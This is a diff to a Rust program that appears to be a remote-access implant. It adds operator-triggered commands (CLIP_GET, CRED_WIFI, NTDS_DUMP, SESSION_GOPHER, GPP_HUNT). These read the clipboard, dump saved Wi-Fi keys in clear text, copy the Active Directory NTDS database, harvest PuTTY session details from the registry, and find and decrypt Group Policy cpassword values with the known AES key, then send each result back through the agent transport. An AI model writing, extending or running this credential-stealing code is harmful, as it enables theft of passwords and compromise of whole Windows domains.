@@ -17,6 +17,14 @@ use windows_sys::Win32::Storage::FileSystem::{
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
 };
+use windows_sys::Win32::System::DataExchange::{
+    OpenClipboard, CloseClipboard, GetClipboardData,
+};
+use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
+use windows_sys::Win32::System::Registry::{
+    RegOpenKeyExW, RegEnumKeyExW, RegQueryValueExW, RegCloseKey,
+    HKEY_CURRENT_USER, KEY_READ,
+};
 
 // ── Win32 constant values (avoids type-alias ambiguity across features) ───────
 const GENERIC_READ_V:               u32 = 0x80000000;
@@ -319,6 +327,215 @@ unsafe fn ads_list_streams(path: &str) -> String {
     if out.is_empty() { "[no alternate streams]".into() } else { out }
 }
 
+// ── Clipboard read ────────────────────────────────────────────────────────────
+
+fn clip_get() -> String {
+    const CF_TEXT: u32 = 1;
+    unsafe {
+        if OpenClipboard(0) == 0 {
+            return format!("[OpenClipboard failed (err {})]", GetLastError());
+        }
+        let h = GetClipboardData(CF_TEXT);
+        if h == 0 {
+            CloseClipboard();
+            return "[clipboard empty or not text]".into();
+        }
+        let hmem = h as *mut core::ffi::c_void;
+        let ptr = GlobalLock(hmem) as *const u8;
+        let result = if ptr.is_null() {
+            "[GlobalLock failed]".into()
+        } else {
+            let mut len = 0usize;
+            while *ptr.add(len) != 0 { len += 1; }
+            let s = std::slice::from_raw_parts(ptr, len);
+            String::from_utf8_lossy(s).into_owned()
+        };
+        if !ptr.is_null() { GlobalUnlock(hmem); }
+        CloseClipboard();
+        result
+    }
+}
+
+// ── Wi-Fi credential dump ─────────────────────────────────────────────────────
+
+fn cred_wifi() -> String {
+    // Enumerate profiles
+    let profiles_out = match std::process::Command::new("netsh")
+        .args(["wlan", "show", "profiles"])
+        .output()
+    {
+        Ok(o) => String::from_utf8_lossy(&o.stdout).into_owned(),
+        Err(e) => return format!("[netsh error: {}]", e),
+    };
+
+    // Extract profile names from lines like: "    All User Profile     : ProfileName"
+    let names: Vec<String> = profiles_out
+        .lines()
+        .filter_map(|l| {
+            let l = l.trim();
+            if let Some(pos) = l.find(':') {
+                let key = l[..pos].trim().to_ascii_lowercase();
+                if key.contains("profile") {
+                    let name = l[pos + 1..].trim().to_string();
+                    if !name.is_empty() { return Some(name); }
+                }
+            }
+            None
+        })
+        .collect();
+
+    if names.is_empty() {
+        return "[no Wi-Fi profiles found]".into();
+    }
+
+    let mut out = String::new();
+    for name in &names {
+        out.push_str(&format!("\n=== {} ===\n", name));
+        match std::process::Command::new("netsh")
+            .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
+            .output()
+        {
+            Ok(o) => out.push_str(&String::from_utf8_lossy(&o.stdout)),
+            Err(e) => out.push_str(&format!("[error: {}]\n", e)),
+        }
+    }
+    out
+}
+
+// ── NTDS dump via ntdsutil ────────────────────────────────────────────────────
+
+fn ntds_dump(dest_path: &str) -> String {
+    let dest = if dest_path.is_empty() {
+        "C:\\Windows\\Temp\\ntds_ifm"
+    } else {
+        dest_path
+    };
+    // ntdsutil "ac i ntds" "ifm" "create full <path>" q q
+    match std::process::Command::new("ntdsutil.exe")
+        .args([
+            "\"ac i ntds\"",
+            "\"ifm\"",
+            &format!("\"create full {}\"", dest),
+            "q",
+            "q",
+        ])
+        .output()
+    {
+        Ok(o) => {
+            let mut r = String::from_utf8_lossy(&o.stdout).into_owned();
+            let e = String::from_utf8_lossy(&o.stderr);
+            if !e.is_empty() { r.push_str(&e); }
+            if r.trim().is_empty() {
+                format!("[+] ntds dump attempted to {}; check path for files", dest)
+            } else {
+                r
+            }
+        }
+        Err(e) => format!("[ntdsutil error: {}]", e),
+    }
+}
+
+// ── PuTTY session harvester ───────────────────────────────────────────────────
+
+fn session_gopher() -> String {
+    let base_path_w = wide("Software\\SimonTatham\\PuTTY\\Sessions");
+    let mut hbase: isize = 0;
+
+    unsafe {
+        let rc = RegOpenKeyExW(
+            HKEY_CURRENT_USER,
+            base_path_w.as_ptr(),
+            0,
+            KEY_READ,
+            &mut hbase,
+        );
+        if rc != 0 {
+            return "[no PuTTY sessions (registry key not found)]".into();
+        }
+
+        let mut out = String::new();
+        let mut idx = 0u32;
+
+        loop {
+            let mut name_buf = [0u16; 512];
+            let mut name_len = 512u32;
+            let rc2 = RegEnumKeyExW(
+                hbase, idx,
+                name_buf.as_mut_ptr(), &mut name_len,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+            );
+            if rc2 != 0 { break; }
+            idx += 1;
+
+            let session_name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
+
+            // Open session subkey under HKCU\...\Sessions\<name>
+            let sub_path = format!(
+                "Software\\SimonTatham\\PuTTY\\Sessions\\{}",
+                session_name
+            );
+            let sub_path_w = wide(&sub_path);
+            let mut hsub: isize = 0;
+            if RegOpenKeyExW(
+                HKEY_CURRENT_USER,
+                sub_path_w.as_ptr(),
+                0,
+                KEY_READ,
+                &mut hsub,
+            ) != 0 {
+                continue;
+            }
+
+            out.push_str(&format!("\n[{}]\n", session_name));
+
+            for field in &["HostName", "UserName", "PortNumber", "Protocol"] {
+                let field_w = wide(field);
+                let mut val_type = 0u32;
+                let mut val_data = [0u8; 1024];
+                let mut val_size = 1024u32;
+                if RegQueryValueExW(
+                    hsub,
+                    field_w.as_ptr(),
+                    std::ptr::null_mut(),
+                    &mut val_type,
+                    val_data.as_mut_ptr(),
+                    &mut val_size,
+                ) == 0 {
+                    // REG_SZ = 1, REG_DWORD = 4
+                    let val: String = if val_type == 1 && val_size >= 2 {
+                        let words: Vec<u16> = val_data[..val_size as usize]
+                            .chunks_exact(2)
+                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                            .collect();
+                        String::from_utf16_lossy(&words)
+                            .trim_end_matches('\0')
+                            .to_string()
+                    } else if val_type == 4 && val_size >= 4 {
+                        u32::from_le_bytes([
+                            val_data[0], val_data[1], val_data[2], val_data[3],
+                        ])
+                        .to_string()
+                    } else {
+                        String::from_utf8_lossy(&val_data[..val_size as usize]).into_owned()
+                    };
+                    out.push_str(&format!("  {} = {}\n", field, val));
+                }
+            }
+            RegCloseKey(hsub);
+        }
+
+        RegCloseKey(hbase);
+        if out.trim().is_empty() {
+            "[no PuTTY sessions found]".into()
+        } else {
+            out
+        }
+    }
+}
+
 // ── Main dispatch ─────────────────────────────────────────────────────────────
 
 pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
@@ -579,6 +796,85 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
             true
         }
 
+        // ── CLIP_GET ─────────────────────────────────────────────────────────
+        "CLIP_GET" => {
+            t.send_result(task.id, &clip_get(), "");
+            true
+        }
+
+        // ── CRED_WIFI ────────────────────────────────────────────────────────
+        "CRED_WIFI" => {
+            t.send_result(task.id, &cred_wifi(), "");
+            true
+        }
+
+        // ── NTDS_DUMP ────────────────────────────────────────────────────────
+        "NTDS_DUMP" => {
+            let dest = if task.args.trim().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
+            } else {
+                task.args.trim().to_string()
+            };
+            t.send_result(task.id, &ntds_dump(&dest), "");
+            true
+        }
+
+        // ── SESSION_GOPHER ───────────────────────────────────────────────────
+        "SESSION_GOPHER" => {
+            t.send_result(task.id, &session_gopher(), "");
+            true
+        }
+
+        // ── GPP_HUNT ─────────────────────────────────────────────────────────
+        "GPP_HUNT" => {
+            t.send_result(task.id, &gpp_hunt(), "");
+            true
+        }
+
         _ => false,
     }
+}
+
+// ── GPP password hunt ─────────────────────────────────────────────────────────
+
+fn gpp_hunt() -> String {
+    let xml_list = shell("dir /s /b %LOGONSERVER%\\SYSVOL\\*.xml 2>nul");
+    if xml_list.trim().is_empty() {
+        return "no .xml files found in SYSVOL".to_string();
+    }
+    let mut output = String::new();
+    for line in xml_list.lines() {
+        let f = line.trim();
+        if f.is_empty() { continue; }
+        let content = match std::fs::read_to_string(f) {
+            Ok(c) => c,
+            Err(_) => continue,
+        };
+        if let Some(cp_idx) = content.find("cpassword=\"") {
+            let start = cp_idx + 11;
+            if let Some(end_off) = content[start..].find('"') {
+                let cpass = &content[start..start + end_off];
+                if cpass.is_empty() { continue; }
+                let ps_script = format!(
+                    "$k=[byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,\
+                     0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,\
+                     0x09,0xa4,0x33,0xb6,0x6c,0x1b);\
+                     try{{$d=[Convert]::FromBase64String('{cp}');\
+                     $a=[Security.Cryptography.AesManaged]::new();\
+                     $a.Key=$k;$a.IV=New-Object byte[] 16;$a.Mode='CBC';$a.Padding='Zeros';\
+                     $dc=$a.CreateDecryptor();\
+                     $pt=$dc.TransformFinalBlock($d,0,$d.Length);\
+                     [Text.Encoding]::Unicode.GetString($pt).TrimEnd([char]0)}}catch{{\"[decrypt failed]\"}}",
+                    cp = cpass
+                );
+                let dec = ps(&ps_script);
+                output.push_str(&format!(
+                    "file: {}\ncpassword: {}\nplaintext: {}\n\n",
+                    f, cpass, dec.trim()
+                ));
+            }
+        }
+    }
+    if output.is_empty() { "no cpasswords found".to_string() } else { output }
 }
